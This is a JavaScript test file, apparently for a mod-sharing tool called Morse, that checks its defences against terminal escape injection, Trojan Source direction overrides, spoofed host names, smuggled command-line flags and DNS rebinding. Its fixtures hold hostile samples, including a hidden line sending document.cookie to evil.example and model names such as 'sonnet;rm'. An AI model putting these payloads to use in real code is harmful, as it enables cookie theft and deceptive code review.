// Bug and security hunt, round 8: model routing and `morse setup`, the
// words and code people review (direction overrides, escape sequences), the
// how-it-works recording script and the demo server. Each test failed before its fix.
import { home } from "./helpers/home.js";
import { test, after } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import path from "node:path";
import { readFileSync, writeFileSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { PassThrough } from "node:stream";
import { noBrowser as skip, launchBrowser } from "./helpers/browser.js";
import { bundleBoot, bundleUI } from "../runtime/bundle.js";

import { parseImport, prepareInstall } from "../core/backup.js";
import { validateMod } from "../core/mod.js";
import { parseEntry } from "../core/gallery.js";
import * as summary from "../core/summary.js";
import { highlight } from "../site/common.js";

void home;
const cleanups = [];
after(async () => { for (const f of cleanups.reverse()) await f().catch(() => {}); });
const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), "..");
const CLI = path.join(ROOT, "daemon", "cli.js");

const mod = (id, extra = {}) => ({ morse: 1, id, title: `Mod ${id}`, prompt: `do ${id}`, css: `.${id} { color: red; }`, js: "", match: { hosts: ["news.example"], app: null }, enabled: true, created: "2026-01-01T00:00:00.000Z", updated: "2026-01-01T00:00:00.000Z", ...extra });
// Characters that make text read (or a terminal behave) differently from what it is.
const HIDDEN = /[\x00-\x09\x0b-\x1f\x7f-\x9f\u061c\u200b-\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069\ufeff]/;
const RLO = "\u202e", RLI = "\u2067", PDI = "\u2069";

// ======================================================================
// The terminal: what `morse` prints from mods and windows
// ======================================================================

test("morse mods, morse code, morse install and morse status print a mod's words, its code and a window's title as text, never escape sequences", async () => {
  const { saveMod } = await import("../daemon/store.js");
  const evil = mod("r8-term", {
    title: "Tidy\x1b]52;c;ZWNobyBoaQ==\x07\x1b[2K",
    prompt: "tidy up\x1b[1A\x1b[2K\r up\u009b2J",
    css: "h1 { color: red }\n/* \x1b[8m */",
    // Concealed text and a line rewritten from the start: the code you read isn't the code that runs.
    js: "morse.toast('hi');\nfetch('https://evil.example/?d=' + document.cookie) // \x1b[1A\x1b[2K\rmorse.toast('bye');\n",
  });
  await saveMod(evil);
  const env = { ...process.env, MORSE_HOME: home, NO_COLOR: "1" };
  const run = (...args) => spawnSync(process.execPath, [CLI, ...args], { env, encoding: "utf8", timeout: 30000 });

  const list = run("mods");
  assert.equal(list.status, 0, list.stderr);
  assert.match(list.stdout, /Tidy/);
  assert.doesNotMatch(list.stdout, HIDDEN, `morse mods: ${JSON.stringify(list.stdout)}`);

  const code = run("code", "r8-term");
  assert.equal(code.status, 0, code.stderr);
  assert.doesNotMatch(code.stdout, HIDDEN, `morse code: ${JSON.stringify(code.stdout)}`);
  // The escape characters are written out, and the lone \r (a line break in JS too) is one.
  assert.match(code.stdout, /document\.cookie\) \/\/ \\u001B\[1A\\u001B\[2K\nmorse\.toast\('bye'\);/, "the reader sees the line the escapes hid");

  const file = path.join(home, "r8-install.morse.json");
  writeFileSync(file, JSON.stringify(mod("r8-inst", { title: "Calm\x1b]0;owned\x07\x1b[2K" })));
  const inst = run("install", file, "--yes");
  assert.equal(inst.status, 0, inst.stderr);
  assert.match(inst.stdout, /Installed Calm/);
  assert.doesNotMatch(inst.stdout, HIDDEN, `morse install: ${JSON.stringify(inst.stdout)}`);

  // `morse status`: window titles come from the app's pages.
  const { formatStatus } = await import("../daemon/status.js");
  const out = formatStatus([{ id: "app", name: "App", state: "attached", port: 9333, windows: [
    { type: "page", url: "app://main/index.html", title: "Inbox\x1b]52;c;ZWNobyBoaQ==\x07\x1b[2K\r(3)", mods: [`Dark${RLO} mode\x1b[8m`] },
  ] }]).replace(/\x1b\[(?:0|1|2|31|32|33|97)m/g, ""); // Morse's own colors, if on
  assert.match(out, /Inbox/);
  assert.doesNotMatch(out, HIDDEN, `morse status: ${JSON.stringify(out)}`);
});

// ======================================================================
// The install review: direction overrides and invisible characters
// ======================================================================

test("a shared mod's sites can't carry direction overrides or invisible characters (shown reversed, they name another site)", async () => {
  // Shown as "For: moc.knab.www" while it runs on www.bank.com, or the other way round.
  for (const hosts of [[RLO, "www.bank.com"], [`${RLO}moc.swen`], ["news.example\u200b"], [`${RLI}news.example${PDI}`]]) {
    assert.throws(() => validateMod(mod("r8-host", { match: { hosts, app: null } })), /where it runs/, JSON.stringify(hosts));
    await assert.rejects(parseImport(JSON.stringify(mod("r8-host", { match: { hosts, app: null } }))), JSON.stringify(hosts));
  }
  assert.throws(() => validateMod(mod("r8-app", { match: { hosts: ["app"], app: `slack${RLO}` } })), /where it runs/);
  // Ordinary sites still are.
  assert.ok(validateMod(mod("r8-ok", { match: { hosts: ["news.example", "*.wiki.example", "127.0.0.1:8795", "file"], app: null } })));
});

test("a shared mod's title, request, author and model can't reverse the review line they're in (a hidden “Not this page”)", async () => {
  const words = {
    title: `Dark mode${RLO}`,
    prompt: `make it dark ${RLI}please`,
    author: `Morse team${RLO}`,
    model: `haiku\u200f${RLO}`,
  };
  const { mods } = await parseImport(JSON.stringify(mod("r8-words", words)));
  for (const k of Object.keys(words)) assert.doesNotMatch(mods[0][k], HIDDEN, `${k}: ${JSON.stringify(mods[0][k])}`);
  assert.equal(mods[0].title, "Dark mode");
  assert.equal(mods[0].author, "Morse team");
  // What is saved is the same, whatever handed it to the host.
  const saved = prepareInstall(mod("r8-words", words), { kind: "link" });
  for (const k of Object.keys(words)) assert.doesNotMatch(saved[k], HIDDEN, `saved ${k}: ${JSON.stringify(saved[k])}`);
  // The gallery's list: its titles, notes and tags are shown the same way.
  const e = parseEntry({ file: "x.morse.json", title: `Dark${RLO} mode`, prompt: `dark${RLI} please`, author: `Team${RLO}`, changes: `fix${RLO}`, tags: [`dark${RLO}`], match: { hosts: ["news.example"] } });
  for (const v of [e.title, e.prompt, e.author, e.changes, ...e.tags]) assert.doesNotMatch(v, HIDDEN, JSON.stringify(v));
});

test("code shown for review (the share page, the gallery page, the install review) shows direction overrides instead of obeying them", () => {
  // "Trojan Source": the comment's override makes the line read as a harmless one.
  const { shownCode } = summary;
  const js = `const ok = true; /* ${RLO} } ;)(eikooc.tnemucod(hctef { */\nmorse.toast("hi");`;
  assert.doesNotMatch(shownCode(js), HIDDEN);
  assert.match(shownCode(js), /\/\* \\u202E \}/);
  assert.equal(shownCode("a\n\tb"), "a\n\tb", "line breaks and tabs stay");
  const html = highlight(js, "js");
  assert.doesNotMatch(html, HIDDEN, html);
  assert.match(html, /\\u202E/);
});

// The boot and the UI on a page, with a stand-in host (as in round 7) that
// answers mods.preview with `preview` and can hand the runtime an install request.
async function reviewPage(preview) {
  const UI = bundleUI(), BOOT = bundleBoot();
  const s = http.createServer((q, r) => {
    if (q.url === "/ui.js") return r.writeHead(200, { "Content-Type": "text/javascript" }).end(UI);
    r.writeHead(200, { "Content-Type": "text/html" }).end("<!doctype html><title>News</title><body><h1>News</h1></body>");
  }).listen(0, "127.0.0.1");
  await new Promise(r => s.on("listening", r));
  cleanups.push(() => new Promise(r => { s.close(r); s.closeAllConnections(); }));
  const browser = await launchBrowser();
  cleanups.push(() => browser.close());
  const ctx = await browser.newContext({ viewport: { width: 1000, height: 800 } });
  await ctx.addInitScript(preview => {
    if (window !== top) return;
    localStorage.setItem("morse:debug", "1"); // an open shadow root (webdriver is on)
    const subs = [];
    const emit = m => subs.forEach(f => f(m));
    window.__emit = emit;
    globalThis.__morseHost = {
      onMessage: f => subs.push(f),
      send(m) {
        const reply = result => setTimeout(() => emit({ reply: m.id, result }), 2);
        switch (m.type) {
          case "hello": return reply({ mode: "extension", label: "test", quiet: true, settings: { welcome: false } });
          case "settings.get": return reply({ welcome: false });
          case "mods.list": return reply([]);
          case "mods.preview": return reply(preview);
          case "ui.load": {
            const el = document.createElement("script");
            el.src = "/ui.js";
            el.onload = () => reply(true);
            document.head.append(el);
            return;
          }
          default: return reply(null);
        }
      },
    };
  }, preview);
  const page = await ctx.newPage();
  await page.goto(`http://127.0.0.1:${s.address().port}/`);
  await page.addScriptTag({ content: BOOT });
  await page.waitForFunction(() => document.querySelector("[data-morse-ui]")?.shadowRoot);
  await page.waitForFunction(() => JSON.parse(document.querySelector("[data-morse-ui]").dataset.status || "{}").ready);
  return page;
}

test("the install review's Show code shows a direction override as \\u202E, not reversed code", { skip, timeout: 60000 }, async () => {
  const js = `morse.toast("hi"); /* ${RLO} } ;)(eikooc.tnemucod(hctef { */`;
  const page = await reviewPage({ kind: "link", mods: [mod("r8-trojan", { js, title: "Hi" })], errors: [] });
  await page.evaluate(() => window.__emit({ type: "install.request", source: "{}" }));
  await page.waitForFunction(() => document.querySelector("[data-morse-ui]").shadowRoot.querySelector(".ctl-code pre"));
  const shown = await page.evaluate(() => [...document.querySelector("[data-morse-ui]").shadowRoot.querySelectorAll(".ctl-code pre")].map(p => p.textContent).join("\n"));
  assert.doesNotMatch(shown, HIDDEN, JSON.stringify(shown));
  assert.match(shown, /\\u202E/);
});

// ======================================================================
// Models: morse setup
// ======================================================================

test("morse setup --fast-model / --best-model refuses a name Morse can't hand to claude or codex, like morse config does", async () => {
  const { runSetup } = await import("../daemon/setup.js");
  const machine = { env: {}, which: async n => (n === "claude" ? "/usr/local/bin/claude" : ""), version: async () => "2.1.3" };
  for (const [flag, name] of [["--fast-model", "-p --dangerously-skip-permissions"], ["--best-model", "sonnet;rm"], ["--fast-model", "-c"]]) {
    const input = new PassThrough(), output = new PassThrough();
    let text = "", saved = null;
    output.on("data", d => (text += d));
    input.end();
    const res = await runSetup(["--use", "claude-code", flag, name], { input, output, deps: machine, load: async () => ({}), save: async c => { saved = c; }, savePrefs: async () => {}, platform: "linux" });
    assert.equal(res.saved, false, `${flag} ${name}: ${text}`);
    assert.equal(saved, null, `${flag} ${name} is not written to config.json`);
    assert.match(text, /isn't a model name/);
  }
  // A real name is still saved.
  const input = new PassThrough(), output = new PassThrough();
  input.end();
  let saved = null;
  const res = await runSetup(["--use", "claude-code", "--fast-model", "claude-haiku-4-5"], { input, output, deps: machine, load: async () => ({}), save: async c => { saved = c; }, savePrefs: async () => {}, platform: "linux" });
  assert.equal(res.saved, true);
  assert.equal(saved.tiers["claude-code"].fast, "claude-haiku-4-5");
});

// ======================================================================
// The how-it-works recording script and the demo server
// ======================================================================

test("demo/record-how-it-works.sh: its X display needs a key, is one nobody else is using, and the app keeps its sandbox", () => {
  const sh = readFileSync(path.join(ROOT, "demo", "record-how-it-works.sh"), "utf8");
  const code = sh.split("\n").filter(l => !/^\s*#/.test(l)).join("\n");
  // Without -auth, any program on the computer can open the display: see the
  // screen, and type into the app (VSCodium has a terminal).
  assert.match(code, /\bXvfb\b[^\n]*-auth\s+"?\$/, "Xvfb starts with an authorization file");
  assert.match(code, /xauth\b[^\n]*\badd\b/, "with a fresh key in it");
  // A fixed display someone else already runs: Xvfb fails, and the script
  // would record and type into that one.
  assert.doesNotMatch(code, /^D=:\d+\s*$/m, "no fixed display number");
  assert.match(code, /kill -0/, "it checks its own Xvfb is the one running");
  // --no-sandbox only where Electron needs it (as root).
  assert.doesNotMatch(code, /^\s*-- --no-sandbox/m, "VSCodium keeps its sandbox");
  const r = spawnSync("bash", ["-n", path.join(ROOT, "demo", "record-how-it-works.sh")], { encoding: "utf8" });
  assert.equal(r.status, 0, r.stderr);
});

test("demo/serve.js: another site (DNS rebinding) can't read the repo through it, .git stays out, and a bad address doesn't stop it", async () => {
  const { serveDemo } = await import("../demo/serve.js");
  const demo = await serveDemo({ base: 0 });
  cleanups.push(() => demo.close());
  const port = demo.sites.parley;
  const get = (p, host = `127.0.0.1:${port}`) => new Promise((resolve, reject) => {
    const q = http.request({ host: "127.0.0.1", port, path: p, headers: { Host: host } }, r => { r.resume(); r.on("end", () => resolve(r.statusCode)); });
    q.on("error", reject);
    q.end();
  });
  assert.equal(await get("/demo/sites/parley/"), 200);
  assert.equal(await get("/demo/sites/parley/", `localhost:${port}`), 200);
  assert.equal(await get("/demo/sites/parley/", "attacker.example"), 403, "a page whose name now points at 127.0.0.1");
  assert.equal(await get("/package.json", "attacker.example:8787"), 403);
  for (const p of ["/.git/HEAD", "/.git/config", "/.env", "/demo/sites/../.git/HEAD"]) assert.notEqual(await get(p), 200, p);
  assert.equal(await get("/%E0%A4%A"), 400);
  assert.equal(await get("/demo/sites/parley/"), 200, "still serving");
});
